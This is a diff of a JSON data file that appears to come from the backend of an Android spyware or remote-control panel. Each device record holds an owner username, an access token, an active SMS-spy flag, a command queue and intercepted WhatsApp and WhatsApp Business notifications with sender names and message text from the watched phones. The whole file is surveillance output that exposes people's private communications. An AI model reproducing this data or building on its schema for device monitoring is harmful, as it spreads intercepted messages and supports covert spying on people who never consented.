@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776957227340,
+    "lastSeen": 1776957257353,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "23/04 23:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776957230435
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 23:13",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776957230161
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 20:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776948121391
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Oi (11 pesan): Membalas Anda",
-        "content": "BEW STORE: 🚀 Executing .crp...\n\n> https://whatsapp.com/channel/0029Vb610enId7nWJHmxu118",
-        "time": "23/04 20:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776948121315
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎66 pesan dari 43 chat",
-        "time": "23/04 20:41",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776948097494
       }
     ],
     "galleryPhotos": [],
@@ -16669,7 +16669,7 @@
     "deviceName": "HP-XXX-2D24",
     "ownerUsername": "is",
     "token": "34abd4f14a5676f3cd2d30b18941c847",
-    "lastSeen": 1776957228143,
+    "lastSeen": 1776957258115,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-23T15:09:35.885Z",
@@ -16685,6 +16685,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WhatsApp Business",
+        "content": "Anda mungkin telah menerima pesan baru",
+        "time": "23/04 22:14",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776957258641
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
